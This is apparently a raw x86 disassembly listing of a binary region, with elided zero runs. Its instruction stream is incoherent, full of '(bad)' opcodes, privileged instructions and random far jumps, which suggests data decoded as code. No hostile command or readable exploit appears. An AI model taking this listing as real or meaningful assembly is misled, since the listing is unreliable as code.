  423c37:	imul   eax,edx,0x96e0b1eb
  423c3d:	je     0x423c26
  423c3f:	call   0x0:0x40
	...
  423cb2:	add    BYTE PTR [eax],al
  423cb4:	mov    edi,0x626d60bd
  423cb9:	std    
  423cba:	mov    edi,0x703576ff
  423cbf:	enter  0x300f,0xb0
  423cc3:	and    al,0xb7
  423cc5:	jge    0x423cc8
  423cc7:	add    ch,dh
  423cc9:	add    BYTE PTR [eax],al
  423ccb:	add    BYTE PTR [eax],bh
  423ccd:	ret    
  423cce:	fadd   st(3),st
  423cd0:	push   ebx
  423cd1:	fwait
  423cd2:	xor    al,0xa
  423cd4:	jnp    0x423ca1
  423cd6:	xor    esi,ecx
  423cd8:	imul   ebp,DWORD PTR [ecx+0x33],0x5451e595
  423cdf:	adc    al,0x65
  423ce1:	loopne 0x423ca1
  423ce3:	mov    eax,0x95e43a13
  423ce8:	xchg   ebp,eax
  423ce9:	mov    esp,0xae867e85
  423cee:	es retf 
  423cf0:	lea    eax,[ecx+0x548a83f0]
  423cf6:	sbb    ecx,esp
  423cf8:	lods   eax,DWORD PTR ds:[esi]
  423cf9:	mov    WORD PTR [ecx-0x4c],?
  423cfc:	repz in al,0x99
  423cff:	fcomp  DWORD PTR [esi+0x10]
  423d02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d03:	mov    ds:0x4240f54d,al
  423d08:	int3   
  423d09:	hlt    
  423d0a:	jle    0x423cab
  423d0c:	adc    dl,BYTE PTR [edx+0x50]
  423d0f:	mov    ds:0x4a39abc9,al
  423d14:	les    eax,FWORD PTR [ecx-0x3a695222]
  423d1a:	stc    
  423d1b:	(bad)  
  423d1c:	cli    
  423d1d:	and    al,0x3e
  423d1f:	push   ecx
  423d20:	jbe    0x423ce5
  423d22:	cmp    eax,0xb994e2fc
  423d27:	stos   DWORD PTR es:[edi],eax
  423d28:	jno    0x423cb7
  423d2a:	pop    ecx
  423d2b:	js     0x423d10
  423d2d:	ins    DWORD PTR es:[edi],dx
  423d2e:	neg    DWORD PTR [edx-0x7]
  423d31:	loope  0x423d61
  423d33:	mov    ds:0x37ee600b,al
  423d38:	retf   0x51ab
  423d3b:	sub    eax,0x2230b35a
  423d40:	nop
  423d41:	jmp    0x26fd:0x79a6196f
  423d48:	shr    esp,0xbe
  423d4b:	and    BYTE PTR [edi+edx*8],cl
  423d4e:	cli    
  423d4f:	outs   dx,DWORD PTR ds:[esi]
  423d50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d51:	push   es
  423d52:	neg    DWORD PTR [edx-0x12]
  423d55:	xchg   ebp,eax
  423d56:	in     al,dx
  423d57:	cld    
  423d58:	or     eax,0x597bf35b
  423d5d:	jp     0x423dc1
  423d5f:	stc    
  423d60:	gs dec eax
  423d62:	push   ds
  423d63:	mov    BYTE PTR [ecx-0x26636c94],al
  423d69:	jae    0x423d0e
  423d6b:	mov    edx,DWORD PTR [ecx+0x77]
  423d6e:	cmp    DWORD PTR [ebx+0x20],ecx
  423d71:	enter  0x1568,0x60
  423d75:	adc    eax,0x994744de
  423d7a:	scas   eax,DWORD PTR es:[edi]
  423d7b:	mov    edx,0x655037d1
  423d80:	dec    edi
  423d81:	popf   
  423d82:	mov    ds,WORD PTR [edi-0x4eaeccc0]
  423d88:	hlt    
  423d89:	mov    ebx,DWORD PTR [edi]
  423d8b:	stos   DWORD PTR es:[edi],eax
  423d8c:	cmp    eax,0xeed68ec4
  423d91:	inc    edx
  423d92:	inc    eax
  423d93:	jno    0x423ddf
  423d95:	jb     0x423d3f
  423d97:	push   ebp
  423d98:	or     al,0xd3
  423d9a:	sbb    DWORD PTR [ebx],edi
  423d9c:	or     edx,DWORD PTR [edi]
  423d9e:	(bad)  
  423d9f:	adc    DWORD PTR [eax-0x4e19207d],eax
  423da5:	xchg   esi,eax
  423da6:	aad    0x73
  423da8:	adc    DWORD PTR es:[ebp+0x39],edi
  423dac:	and    eax,0x97ef6ee4
  423db1:	xchg   edx,eax
  423db2:	sub    BYTE PTR [esi+0x74],ah
  423db5:	xchg   ebp,eax
  423db6:	xchg   BYTE PTR [eax-0x56],dh
  423db9:	or     DWORD PTR [edx+0x1515900],ebp
  423dbf:	jne    0x423def
	...
  423e31:	add    BYTE PTR [eax],al
  423e33:	add    BYTE PTR [ebx-0x21e677ab],al
  423e39:	fst    QWORD PTR [ebx+0x6b48c6df]
  423e3f:	out    dx,eax
  423e40:	test   DWORD PTR [edi-0x1f],0x17eac54
  423e47:	add    ch,dh
  423e49:	add    BYTE PTR [eax],al
  423e4b:	add    bl,dl
  423e4d:	dec    ecx
  423e4e:	es sbb eax,0x2b4fd342
  423e54:	add    esi,DWORD PTR [edi]
  423e56:	adc    DWORD PTR [edi],ebx
  423e58:	ret    
  423e59:	jbe    0x423ecd
  423e5b:	and    al,BYTE PTR [ecx]
  423e5d:	std    
  423e5e:	mov    dh,0xc4
  423e60:	cmp    DWORD PTR [edx],0x335735c4
  423e66:	inc    edi
  423e67:	hlt    
  423e68:	jp     0x423ea3
  423e6a:	loopne 0x423ed5
  423e6c:	sub    BYTE PTR [edi+0x19],bh
  423e6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e70:	push   0xffffff9f
  423e72:	mov    ch,BYTE PTR [edi]
  423e74:	(bad)  [ecx+eax*8-0x78717a94]
  423e7b:	aaa    
  423e7c:	stc    
  423e7d:	push   ecx
  423e7e:	scas   al,BYTE PTR es:[edi]
  423e7f:	inc    ebx
  423e80:	add    DWORD PTR [ecx],ebp
  423e82:	ss js  0x423e0e
  423e85:	pusha  
  423e86:	inc    eax
  423e87:	inc    ebx
  423e88:	leave  
  423e89:	or     esi,edx
  423e8b:	cli    
  423e8c:	pop    edi
  423e8d:	(bad)  
  423e8e:	push   esi
  423e8f:	mov    edx,0xd9e57d81
  423e94:	add    al,0xe6
  423e96:	pop    edi
  423e97:	pop    ebp
  423e98:	int3   
  423e99:	mov    esp,0x2cc35fc1
  423e9e:	lods   al,BYTE PTR ds:[esi]
  423e9f:	rcl    DWORD PTR [ecx],0xd6
  423ea2:	icebp  
  423ea3:	mov    gs:0xc8457fe5,al
  423ea9:	mov    ecx,0xbc758b0b
  423eae:	test   DWORD PTR [edx-0x3f426270],eax
  423eb4:	fs stc 
  423eb6:	adc    ebx,eax
  423eb8:	fild   DWORD PTR ds:0xb4e57ea9
  423ebe:	cdq    
  423ebf:	(bad)  
  423ec0:	js     0x423e57
  423ec2:	sti    
  423ec3:	sbb    edi,ebx
  423ec5:	mov    bl,0x3e
  423ec7:	retf   
  423ec8:	cmp    ebx,DWORD PTR [ebx]
  423eca:	xor    edi,edx
  423ecc:	dec    edi
  423ecd:	scas   al,BYTE PTR es:[edi]
  423ece:	into   
  423ecf:	xchg   ebp,eax
  423ed0:	loope  0x423ecb
  423ed2:	and    DWORD PTR [esi-0x3661f9bb],esi
  423ed8:	and    eax,0x657bee5e
  423edd:	xchg   BYTE PTR [ecx+eiz*4-0x2a],bl
  423ee1:	xchg   DWORD PTR [esi-0x25],eax
  423ee4:	jne    0x423e7f
  423ee6:	fbstp  TBYTE PTR [eax-0x16]
  423ee9:	faddp  st(6),st
  423eeb:	mov    ah,0xef
  423eed:	iret   
  423eee:	xor    eax,0x82c66ff4
  423ef3:	mov    dl,0x10
  423ef5:	push   es
  423ef6:	xchg   ecx,eax
  423ef7:	mov    ebp,0x6d1c3970
  423efc:	loope  0x423eed
  423efe:	dec    ecx
  423eff:	push   edx
  423f00:	add    BYTE PTR [edx-0x52],al
  423f03:	call   FWORD PTR [eax+0x74]
  423f06:	cmp    eax,DWORD PTR [ebp-0x25befe83]
  423f0c:	das    
  423f0d:	shl    DWORD PTR [edx+0x77],cl
  423f10:	adc    DWORD PTR [ebp-0x3d7571a4],esp
  423f16:	push   0x965e9f6c
  423f1b:	inc    ebp
  423f1c:	mov    bl,BYTE PTR [esi]
  423f1e:	test   al,0xd8
  423f20:	test   DWORD PTR [ebp-0xd7e8b2],eax
  423f26:	sbb    al,0x9a
  423f28:	add    cl,0xe
  423f2b:	or     DWORD PTR [edi],esp
  423f2d:	jecxz  0x423f11
  423f2f:	out    0x1e,eax
  423f31:	push   0xc37a8af1
  423f36:	mov    bl,0xac
  423f38:	ins    DWORD PTR es:[edi],dx
  423f39:	mov    dh,BYTE PTR [edi+0x10653647]
  423f3f:	mov    dl,0x8e
	...
  423fb1:	add    BYTE PTR [eax],al
  423fb3:	add    BYTE PTR [esi-0x1c],al
  423fb6:	bound  ecx,QWORD PTR [eax-0x1111711e]
  423fbc:	in     al,dx
  423fbd:	pop    ebx
  423fbe:	test   BYTE PTR [edx-0x6c],dh
  423fc1:	test   DWORD PTR [ebx-0x76],0x17fa1
  423fc8:	cmc    
  423fc9:	add    BYTE PTR [eax],al
  423fcb:	add    BYTE PTR [ebx],bl
  423fcd:	xor    al,0x56
  423fcf:	push   edi
  423fd0:	clc    
  423fd1:	xor    al,0xdf
  423fd3:	push   ds
  423fd4:	test   DWORD PTR [ecx+0x4139bcd5],0x1bf5de25
  423fde:	jg     0x424005
  423fe0:	test   DWORD PTR [esp+ecx*2-0x38],ebx
  423fe4:	cmp    bl,BYTE PTR [ebp+0x248fba7a]
  423fea:	jle    0x423fef
  423fec:	aam    0x36
  423fee:	xor    BYTE PTR [edi+eiz*1+0x4d],al
  423ff2:	out    0x8,al
  423ff4:	jmp    0x6fa7:0xa124627c
  423ffb:	jle    0x42404a
  423ffd:	jb     0x423ffb
  423fff:	mov    ds:0x2cb911fc,eax
  424004:	stos   BYTE PTR es:[edi],al
  424005:	push   es
  424006:	std    
  424007:	sbb    esi,ebx
  424009:	mov    cs,WORD PTR [eax+0x3d2c75f5]
  42400f:	mov    ebx,0x3070eae7
  424014:	and    al,BYTE PTR [esi+ebp*1-0x765a50d5]
  42401b:	dec    eax
  42401c:	add    edx,edx
  42401e:	iret   
  42401f:	ret    0x317
  424022:	add    al,BYTE PTR [esi+0x2942bf4e]
  424028:	aam    0x90
  42402a:	dec    esi
  42402b:	pop    esp
  42402c:	out    dx,eax
  42402d:	add    eax,0xc15bf0e0
  424032:	cmp    BYTE PTR [edx+edi*1-0x3d],0xa9
  424037:	xchg   esi,eax
  424038:	mov    WORD PTR [esi-0x7a],ds
  42403b:	pop    eax
  42403c:	xor    BYTE PTR [ebp-0x8],dh
  42403f:	sbb    esp,esp
  424041:	dec    esi
  424042:	fsubr  st(4),st
  424044:	int3   
  424045:	lahf   
  424046:	pop    ds
  424047:	and    ebp,DWORD PTR [esi]
  424049:	call   DWORD PTR [edi+eax*1-0x4094b546]
  424050:	(bad)  
  424051:	pop    ds
  424052:	loop   0x423ff7
  424054:	xchg   edx,eax
  424055:	inc    ecx
  424056:	add    edi,edi
  424058:	add    DWORD PTR [edx-0x4741fd04],ebp
  42405e:	test   eax,0x989883a5
  424063:	or     BYTE PTR [ecx],dh
  424065:	push   0xffffff94
  424067:	fcom   st(3)
  424069:	or     ebp,DWORD PTR [edi+0x25b4641b]
  42406f:	sbb    edi,0xf9a18870
  424075:	jae    0x42408f
  424077:	jge    0x424009
  424079:	mov    esi,0x28c9852f
  42407e:	rcr    BYTE PTR [ecx],0xf3
  424081:	call   0x19eb:0x94beb86f
  424088:	mov    dh,BYTE PTR [ebx]
  42408a:	lea    esp,[esi]
  42408c:	pop    eax
  42408d:	jae    0x4240bb
  42408f:	call   0x9cc95c1c
  424094:	ret    0x374a
  424097:	cld    
  424098:	int3   
  424099:	test   DWORD PTR [ebx],eax
  42409b:	sub    DWORD PTR [edi],edx
  42409d:	xchg   edx,eax
  42409e:	jbe    0x42404b
  4240a0:	les    ecx,FWORD PTR [esi-0x20]
  4240a3:	bound  ecx,QWORD PTR [edx-0x45]
  4240a6:	xchg   BYTE PTR [eax-0x6d],dh
  4240a9:	adc    DWORD PTR [ebx],ebx
  4240ab:	or     ebx,DWORD PTR [edi]
  4240ad:	ret    
  4240ae:	cmp    DWORD PTR [ebx+edx*2+0x1e],0x97c38c68
  4240b6:	jg     0x424126
  4240b8:	nop
  4240b9:	xchg   ecx,eax
  4240ba:	stos   BYTE PTR es:[edi],al
  4240bb:	xchg   BYTE PTR [edx-0x1681c0a3],bh
	...
  424131:	add    BYTE PTR [eax],al
  424133:	add    BYTE PTR [ecx-0xf],bh
  424136:	div    DWORD PTR [ecx-0x6804801]
  42413c:	bound  esi,QWORD PTR [eax+0x59a17b6a]
  424142:	pop    ecx
  424143:	mov    edx,DWORD PTR [esi-0xafffe80]
  424149:	add    BYTE PTR [eax],al
  42414b:	add    BYTE PTR [ecx+edx*1-0x29],cl
  42414f:	mov    esi,0xc059cca2
  424154:	(bad)  
  424156:	fidiv  WORD PTR [esi-0x65]
  424159:	inc    DWORD PTR [esi]
  42415b:	jo     0x42417c
  42415d:	lds    ecx,FWORD PTR [edi+edi*2+0x3cee191f]
  424164:	push   eax
  424165:	cmc    
  424166:	ds retf 
  424168:	ficom  DWORD PTR [edx+0x2ac5945e]
  42416e:	jbe    0x424124
  424170:	pushf  
  424171:	adc    ebp,DWORD PTR [ecx+eiz*8]
  424174:	repnz push es
  424176:	mov    ch,0xb1
  424178:	jb     0x424122
  42417a:	sahf   
  42417b:	jbe    0x4241af
  42417d:	sub    bl,BYTE PTR [esi]
  42417f:	mov    bl,0xf8
  424181:	repz jo 0x424132
  424184:	add    esi,edi
  424186:	push   0xffffffbf
  424188:	inc    edx
  424189:	adc    ebx,ebx
  42418b:	inc    ebp
  42418c:	mov    edx,0xe1fef7fe
  424191:	clc    
  424192:	in     eax,dx
  424193:	adc    al,0xa0
  424195:	sbb    al,0xc1
  424197:	in     eax,0x69
  424199:	je     0x4241af
  42419b:	test   al,0x91
  42419d:	rcr    DWORD PTR [edx+0x3f],1
  4241a0:	push   ds
  4241a1:	popf   
  4241a2:	mov    BYTE PTR [esi-0x24369456],al
  4241a8:	push   ebx
  4241a9:	sub    eax,eax
  4241ab:	sub    DWORD PTR [ebx-0x327eeb38],eax
  4241b1:	scas   eax,DWORD PTR es:[edi]
  4241b2:	(bad)  
  4241b3:	mov    ebx,0x651e8190
  4241b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241b9:	pop    eax
  4241ba:	cmp    edx,DWORD PTR [ebx+0x58]
  4241bd:	jnp    0x42416c
  4241bf:	add    esi,DWORD PTR [edi+ecx*2+0x2e994b1d]
  4241c6:	jns    0x4241bd
  4241c8:	shr    BYTE PTR [esi-0x1b],0xc6
  4241cc:	mov    ch,0x65
  4241ce:	xor    BYTE PTR [esi+0x79ef2a34],bl
  4241d4:	and    DWORD PTR [ebx+0x3],edx
  4241d7:	rol    BYTE PTR [eax+0x29],cl
  4241da:	clc    
  4241db:	xchg   DWORD PTR [ebp+0x39],edx
  4241de:	stc    
  4241df:	dec    esp
  4241e0:	addr16 add eax,0xccbdfa8c
  4241e6:	icebp  
  4241e7:	sub    ecx,DWORD PTR [ebx-0x11613ca7]
  4241ed:	leave  
  4241ee:	and    BYTE PTR [ebx-0x49],0xd7
  4241f2:	loope  0x4241a7
  4241f4:	loop   0x42418d
  4241f6:	jle    0x4241a1
  4241f8:	pushf  
  4241f9:	(bad)  
  4241fa:	loopne 0x424270
  4241fc:	div    eax
  4241fe:	sub    dl,dl
  424200:	fcomip st,st(2)
  424202:	loopne 0x424185
  424204:	imul   esi,DWORD PTR [edx+0x42],0x4fc85a30
  42420b:	ins    DWORD PTR es:[edi],dx
  42420c:	nop
  42420d:	ds jo  0x424221
  424210:	(bad)  [ebp+0x63e802c0]
  424216:	test   DWORD PTR [esi-0x7c17172a],esi
  42421c:	mov    ch,al
  42421e:	sub    edi,ecx
  424220:	dec    eax
  424221:	jg     0x424220
  424223:	test   DWORD PTR [ecx],0x36c4268a
  424229:	shl    BYTE PTR [esi+0x23],cl
  42422c:	lds    ecx,FWORD PTR [ebx]
  42422e:	les    esi,FWORD PTR [edi+0x6d]
  424231:	pop    edi
  424232:	dec    edx
  424233:	cmc    
  424234:	imul   BYTE PTR [edi]
  424236:	imul   esi,DWORD PTR [edi+0x7c6a6dcb],0xead370ec
  424240:	xchg   edx,eax
	...
  4242b1:	add    BYTE PTR [eax],al
  4242b3:	add    al,bh
  4242b5:	fisub  WORD PTR [edx+0x30]
  4242b8:	mov    sp,0xdefa
  4242bc:	push   ss
  4242bd:	mov    ds:0x3dd8a4bf,eax
  4242c2:	lds    edi,FWORD PTR [eax]
  4242c4:	mov    eax,DWORD PTR [ecx+0xf50001]
  4242ca:	add    BYTE PTR [eax],al
  4242cc:	fstp   TBYTE PTR [eax]
  4242ce:	and    ebx,esi
  4242d0:	xchg   ecx,eax
  4242d1:	lods   al,BYTE PTR ds:[esi]
  4242d2:	jg     0x424268
  4242d4:	sub    eax,0x743b5711
  4242d9:	gs xor eax,0x38bb95af
  4242df:	sbb    eax,0x7ef054bc
  4242e4:	xor    DWORD PTR [esi-0x18],esp
  4242e7:	arpl   WORD PTR [ebp+0x53a947dc],sp
  4242ed:	(bad)  
  4242ee:	cmc    
  4242ef:	outs   dx,DWORD PTR ds:[esi]
  4242f0:	mov    al,BYTE PTR [edi-0x419eef5f]
  4242f6:	stos   BYTE PTR es:[edi],al
  4242f7:	es cwde 
  4242f9:	sbb    DWORD PTR [eax+eiz*4+0x1d],edi
  4242fd:	dec    ebx
  4242fe:	out    0x80,al
  424300:	call   0x40e72652
  424305:	scas   al,BYTE PTR es:[edi]
  424306:	jbe    0x4242b7
  424308:	inc    edx
  424309:	mov    ebx,0x25613808
  42430e:	inc    edx
  42430f:	(bad)  
  424310:	(bad)  
  424311:	jecxz  0x424368
  424313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424314:	pop    esp
  424315:	xor    ecx,DWORD PTR [edx]
  424317:	lahf   
  424318:	inc    esi
  424319:	out    0xe1,al
  42431b:	mov    edi,0xf7c55403
  424320:	jae    0x424322
  424322:	jb     0x42438f
  424324:	ss xchg ebp,eax
  424326:	ret    
  424327:	call   0xa9738ca0
  42432c:	sbb    BYTE PTR [ebx-0x33],0xd
  424330:	inc    ebp
  424331:	aas    
  424332:	mov    edx,0xdcd8c48b
  424337:	rcr    BYTE PTR [edx],cl
  424339:	out    0x4e,al
  42433b:	add    esi,0x4a3a08dd
  424341:	mov    ah,0x8d
  424343:	das    
  424344:	inc    ecx
  424345:	sub    edx,DWORD PTR [ebp+0x5e1e2d64]
  42434b:	lahf   
  42434c:	cs jne 0x424338
  42434f:	jg     0x424339
  424351:	xchg   esp,eax
  424352:	sbb    BYTE PTR gs:[eax-0x75388faa],ah
  424359:	sub    al,0xbc
  42435b:	out    dx,eax
  42435c:	jecxz  0x4242df
  42435e:	or     ecx,ecx
  424360:	sub    bl,dh
  424362:	mov    cl,0xad
  424364:	fild   DWORD PTR [eax+ecx*8-0x23]
  424368:	jne    0x42438b
  42436a:	sbb    BYTE PTR [ebp-0x7b682581],0x1f
  424371:	in     al,0x88
  424373:	mov    ecx,0xe462d925
  424378:	rol    ah,0x5a
  42437b:	aas    
  42437c:	push   0x1e2b6196
  424381:	test   eax,0x6d98ee13
  424386:	or     BYTE PTR [esi+0x61bb6cee],al
  42438c:	add    DWORD PTR [edi],ecx
  42438e:	adc    ah,BYTE PTR [ebp-0x6f]
  424391:	mov    WORD PTR [ebp-0x4cc5a44b],es
  424397:	add    ecx,edx
  424399:	out    dx,eax
  42439a:	dec    ecx
  42439b:	mov    al,0x79
  42439d:	and    BYTE PTR [esi],0xbb
  4243a0:	imul   ebx,DWORD PTR [ebp+0xf],0x3c
  4243a4:	add    eax,0x396e1c
  4243a9:	add    ah,al
  4243ab:	out    dx,al
  4243ac:	stos   DWORD PTR es:[edi],eax
  4243ad:	imul   BYTE PTR [esi-0x1e]
  4243b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4243b1:	push   ebx
  4243b2:	mov    bl,cl
  4243b4:	and    BYTE PTR [edx+0xb],0xa4
  4243b8:	sbb    BYTE PTR [esi-0x62809853],ah
  4243be:	scas   eax,DWORD PTR es:[edi]
  4243bf:	js     0x424387
	...
  424431:	add    BYTE PTR [eax],al
  424433:	add    al,al
  424435:	mov    al,0x45
  424437:	outs   dx,DWORD PTR ds:[esi]
  424438:	jne    0x424439
  42443a:	jmp    0xa5d2:0x8abb70bf
  424441:	push   ebx
  424442:	sar    BYTE PTR [edi+0x18280],cl
  424448:	cmc    
  424449:	add    BYTE PTR [eax],al
  42444b:	add    dh,ah
  42444d:	aaa    
  42444e:	mov    al,0xc
  424450:	or     al,0xad
  424452:	mov    ebx,esp
  424454:	mov    ebp,0x708c2de0
  424459:	cmp    ebx,eax
  42445b:	dec    ebx
  42445c:	mov    ecx,0xfbb690ea
  424461:	int    0x76
  424463:	stc    
  424464:	cmp    ch,bh
  424466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424467:	cmp    eax,0x5c1310a7
  42446c:	hlt    
  42446d:	or     al,0x41
  42446f:	sub    ah,BYTE PTR [edx-0x2c07410c]
  424475:	in     al,0xfa
  424477:	fnsave [edi-0x7a]
  42447a:	mov    cl,0xfa
  42447c:	and    BYTE PTR [eax-0x18baae2e],ah
  424482:	pop    edx
  424483:	inc    ebx
  424484:	inc    esi
  424485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424486:	dec    eax
  424487:	xor    BYTE PTR [ebp-0x5d2263a8],bh
  42448d:	std    
  42448e:	xchg   ebx,eax
  42448f:	and    eax,0x3bea2e43
  424494:	dec    edi
  424495:	popf   
  424496:	pop    ss
  424497:	sahf   
  424498:	pop    esi
  424499:	xor    al,0xc7
  42449b:	adc    al,0x5d
  42449d:	lea    eax,[eax+0x424618df]
  4244a3:	mov    WORD PTR [edi+edx*1-0x65447fe0],fs
  4244aa:	mov    ch,BYTE PTR [ecx-0x6d]
  4244ad:	mov    dl,0xaa
  4244af:	popa   
  4244b0:	ret    
  4244b1:	pop    es
  4244b2:	test   BYTE PTR [ebx-0x66],dl
  4244b5:	in     eax,dx
  4244b6:	xlat   BYTE PTR ds:[ebx]
  4244b7:	cdq    
  4244b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244b9:	rol    eax,1
  4244bb:	jmp    0x769f:0x7937332c
  4244c2:	sbb    ch,BYTE PTR [ebx]
  4244c4:	(bad)  
  4244c5:	loope  0x4244e3
  4244c7:	sar    DWORD PTR [edi],cl
  4244c9:	das    
  4244ca:	inc    esp
  4244cb:	test   al,0xfd
  4244cd:	mov    esi,0x3fad621a
  4244d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244d3:	pop    esi
  4244d4:	mov    bl,cl
  4244d6:	jae    0x42453e
  4244d8:	xchg   edi,eax
  4244d9:	inc    esp
  4244da:	cs ins BYTE PTR es:[edi],dx
  4244dc:	dec    edx
  4244dd:	xlat   BYTE PTR ds:[ebx]
  4244de:	mov    WORD PTR [esi+esi*2],gs
  4244e1:	pop    esi
  4244e2:	mov    dh,0xe8
  4244e4:	sti    
  4244e5:	(bad)  
  4244e6:	leave  
  4244e7:	mov    ch,0xe1
  4244e9:	and    al,0x1a
  4244eb:	cs in  al,0x28
  4244ee:	inc    ecx
  4244ef:	push   es
  4244f0:	ror    ecx,cl
  4244f2:	fisttp WORD PTR [ecx]
  4244f4:	jbe    0x424525
  4244f6:	mov    al,0xf1
  4244f8:	out    dx,eax
  4244f9:	fild   DWORD PTR ds:0x75b49096
  4244ff:	out    0x5f,eax
  424501:	push   ebx
  424502:	sub    eax,0xa294ab97
  424507:	std    
  424508:	iret   
  424509:	arpl   WORD PTR [ecx+0x728f026e],si
  42450f:	gs jle 0x4244f6
  424512:	dec    ebp
  424513:	cmc    
  424514:	(bad)  
  424515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424516:	ror    ch,0x27
  424519:	inc    ebx
  42451a:	jae    0x4244c0
  42451c:	cli    
  42451d:	mov    DWORD PTR [ebp+0x77],ecx
  424520:	outs   dx,BYTE PTR ds:[si]
  424522:	mov    al,0xb
  424524:	loope  0x424505
  424526:	mov    al,gs:0x2c302579
  42452c:	mov    ecx,0xd17a4e5c
  424531:	jle    0x424563
  424533:	sub    eax,0xc9710f09
  424538:	js     0x42457a
  42453a:	inc    esi
  42453b:	lock mov bl,0xc
  42453e:	adc    al,0x97
  424540:	mov    edx,0x0
	...
  4245b1:	add    BYTE PTR [eax],al
  4245b3:	add    BYTE PTR [eax+0x7f747c8f],al
  4245b9:	test   DWORD PTR [eax+0x6c527eff],0x695bce31
  4245c3:	mov    eax,0x18375
  4245c8:	cmc    
  4245c9:	add    BYTE PTR [eax],al
  4245cb:	add    BYTE PTR [edx],al
  4245cd:	push   ebx
  4245ce:	js     0x42460a
  4245d0:	push   eax
  4245d1:	sbb    dh,0x6d
  4245d4:	add    DWORD PTR [edi+0x46e8a43a],ecx
  4245da:	js     0x424618
  4245dc:	test   al,0xef
  4245de:	mov    eax,ds:0xe8cdc860
  4245e3:	dec    esp
  4245e4:	cmp    dh,dl
  4245e6:	cwde   
  4245e7:	cmp    eax,0xd4d0be16
  4245ec:	ss or  al,0x79
  4245ef:	jle    0x424575
  4245f1:	out    dx,eax
  4245f2:	es push esi
  4245f4:	and    DWORD PTR [edi],esp
  4245f6:	ins    DWORD PTR es:[edi],dx
  4245f7:	sar    eax,0xf2
  4245fa:	cs jmp 0x7fd8:0x2ae23db4
  424602:	xchg   ebp,eax
  424603:	(bad)  
  424604:	mov    esi,0x995fc75b
  424609:	jnp    0x424651
  42460b:	in     eax,dx
  42460c:	xor    edx,DWORD PTR [ecx+0x34d914b4]
  424612:	retf   
  424613:	jb     0x42467c
  424615:	pop    ecx
  424616:	dec    esi
  424617:	mov    cl,0xfb
  424619:	fs jnp 0x42467a
  42461c:	push   ecx
  42461d:	or     DWORD PTR [eax+edx*4+0x24b68003],ebp
  424624:	leave  
  424625:	push   ebp
  424626:	in     eax,0x83
  424628:	mov    eax,0x8eb9ed17
  42462d:	lods   eax,DWORD PTR ds:[esi]
  42462e:	sahf   
  42462f:	push   ebx
  424630:	and    BYTE PTR [ecx+0x3f],al
  424633:	pop    ebx
  424634:	leave  
  424635:	mov    ds,WORD PTR [eax-0x4d]
  424638:	or     esi,ebx
  42463a:	adc    ebp,ebp
  42463c:	and    al,0xee
  42463e:	in     al,dx
  42463f:	addr16 out 0xe0,al
  424642:	jo     0x424604
  424644:	push   edx
  424645:	ja     0x42462b
  424647:	xchg   esi,eax
  424648:	push   ds
  424649:	or     cl,BYTE PTR [eax]
  42464b:	add    eax,0x92f48749
  424650:	push   esi
  424651:	fldenv [ebx-0x80]
  424654:	(bad)  
  424655:	jnp    0x424603
  424657:	pop    ecx
  424658:	pop    edx
  424659:	(bad)  
  42465a:	xor    esp,edi
  42465c:	or     DWORD PTR [ebp+edi*2-0x695711cf],edx
  424663:	ja     0x4246a6
  424665:	push   ss
  424666:	xor    esp,DWORD PTR [eax+0xc405f69]
  42466c:	jge    0x4246e8
  42466e:	ja     0x424602
  424670:	int3   
  424671:	mov    ds:0x4c29b0bb,al
  424676:	(bad)  
  424677:	aaa    
  424678:	mov    esi,0xa0f9db1a
  42467d:	push   ebx
  42467e:	jg     0x4246cd
  424680:	enter  0x8b8a,0xed
  424684:	add    al,0x1c
  424686:	xor    DWORD PTR [eax+0x2],ecx
  424689:	push   0x72
  42468b:	addr16 mov ds:0x3b12,al
  42468f:	cmp    BYTE PTR [edx-0x5f769978],al
  424695:	inc    esi
  424696:	sbb    ah,BYTE PTR [edi-0x2a581100]
  42469c:	adc    al,0x1e
  42469e:	and    eax,DWORD PTR [eax-0xca8dc2]
  4246a4:	cmp    edi,DWORD PTR [ebx+ecx*4]
  4246a7:	pop    esp
  4246a8:	and    al,0xde
  4246aa:	adc    dh,BYTE PTR [eax+eax*8+0x2fb79080]
  4246b1:	lods   eax,DWORD PTR ds:[esi]
  4246b2:	mov    al,ds:0x10648e11
  4246b7:	xchg   DWORD PTR [ebp+0x3e],ebx
  4246ba:	aas    
  4246bb:	xchg   esi,eax
  4246bc:	dec    ebp
  4246bd:	fsubp  st(2),st
  4246bf:	xchg   ebp,eax
  4246c0:	mov    al,ds:0x0
	...
  424731:	add    BYTE PTR [eax],al
  424733:	add    BYTE PTR [ebx+eiz*1],dh
  424736:	jo     0x4246d5
  424738:	ja     0x424719
  42473a:	std    
  42473b:	stos   DWORD PTR es:[edi],eax
  42473c:	lods   eax,DWORD PTR ds:[esi]
  42473d:	and    ebp,esi
  42473f:	fisttp QWORD PTR ds:0x6a8ebdbf
  424745:	test   BYTE PTR [ecx],al
  424747:	add    ch,dh
  424749:	add    BYTE PTR [eax],al
  42474b:	add    BYTE PTR [edi],bl
  42474d:	sub    al,0x96
  42474f:	lahf   
  424750:	(bad)  
  424752:	out    dx,al
  424753:	add    al,0x75
  424755:	add    eax,DWORD PTR [edx-0x12f1b019]
  42475b:	jecxz  0x4246de
  42475d:	(bad)  [esi+edx*2]
  424760:	xchg   DWORD PTR ds:0x12f00e97,edi
  424766:	mov    esp,0x3db58278
  42476b:	test   BYTE PTR [edi+0x3331347c],bh
  424771:	addr16 dec esp
  424773:	xor    al,0xd2
  424775:	in     al,0x13
  424777:	mov    ebx,gs
  424779:	or     edx,edx
  42477b:	adc    BYTE PTR [edx-0x31],ch
  42477e:	jnp    0x424759
  424780:	sbb    eax,0x3bd8f6bd
  424785:	in     eax,dx
  424786:	xchg   DWORD PTR [ecx-0x2ee0cc4],eax
  42478c:	lods   eax,DWORD PTR ds:[esi]
  42478d:	pop    esp
  42478e:	rcr    BYTE PTR [edx],1
  424790:	push   esp
  424791:	or     DWORD PTR ds:0x299a64ff,ebx
  424797:	outs   dx,BYTE PTR ds:[esi]
